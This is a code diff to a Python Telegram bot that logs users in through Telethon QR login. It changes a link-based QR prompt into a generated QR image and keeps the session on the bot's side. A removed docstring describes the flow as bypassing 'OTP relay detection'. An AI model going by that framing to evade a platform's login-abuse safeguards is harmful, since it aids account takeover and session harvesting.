@@ -2248,7 +2248,7 @@ async def connect_user_session(query):
         )
         return SELECTING_ACTION
 async def connect_user_session_qr(query):
-    """Connect via QR code - bypasses OTP relay detection"""
+    """Connect via QR code - generates actual QR image"""
     global pending_clients
     user_id = query.from_user.id
     user = db.get_user(user_id)
@@ -2261,33 +2261,55 @@ async def connect_user_session_qr(query):
     
     try:
         from telethon.sessions import StringSession
+        import qrcode
+        import io
         
         client = TelegramClient(StringSession(), 
                                user['telegram_api_id'], 
                                user['telegram_api_hash'])
         await client.connect()
         
-        # Generate QR login - returns a QRLogin object
+        # Generate QR login
         qr_login = await client.qr_login()
         
         # Store client
         pending_clients[user_id] = {'client': client, 'qr': qr_login}
         
-        # The QR code URL
-        qr_url = qr_login.url
+        # Generate QR code image
+        qr = qrcode.QRCode(version=1, box_size=10, border=4)
+        qr.add_data(qr_login.url)
+        qr.make(fit=True)
+        img = qr.make_image(fill_color="black", back_color="white")
         
-        await query.edit_message_text(
-            f"📱 *Scan QR Code to Login*\n\n"
-            f"🔗 [Click here to login]({qr_url})\n\n"
-            f"Or copy this link and open on your phone:\n"
-            f"`{qr_url}`\n\n"
-            f"⏳ Waiting for approval... (2 min timeout)",
-            reply_markup=get_back_keyboard(),
-            parse_mode='Markdown',
-            disable_web_page_preview=True
+        # Convert to bytes
+        bio = io.BytesIO()
+        img.save(bio, format='PNG')
+        bio.seek(0)
+        
+        # Send QR code image
+        await query.message.reply_photo(
+            photo=bio,
+            caption=(
+                "📱 *Login via QR Code*\n\n"
+                "1. Open Telegram on your phone\n"
+                "2. Go to Settings → Devices → Scan QR\n"
+                "3. Scan this QR code\n\n"
+                "⏳ Waiting for approval... (2 min)"
+            ),
+            parse_mode='Markdown'
         )
         
-        # Wait for QR login with timeout
+        # Edit original message
+        await query.edit_message_text(
+            "📱 *QR Code sent above!*\n\n"
+            "Scan it with your phone's Telegram app.\n"
+            "Settings → Devices → Scan QR\n\n"
+            "⏳ Waiting for approval...",
+            reply_markup=get_back_keyboard(),
+            parse_mode='Markdown'
+        )
+        
+        # Wait for QR login
         try:
             await asyncio.wait_for(qr_login.wait(), timeout=120)
             
@@ -2319,7 +2341,7 @@ async def connect_user_session_qr(query):
             pending_clients.pop(user_id, None)
             await client.disconnect()
             await query.edit_message_text(
-                "⏰ QR login timed out. Please try again.",
+                "⏰ QR login timed out. Try again.",
                 reply_markup=get_main_keyboard()
             )
             return SELECTING_ACTION
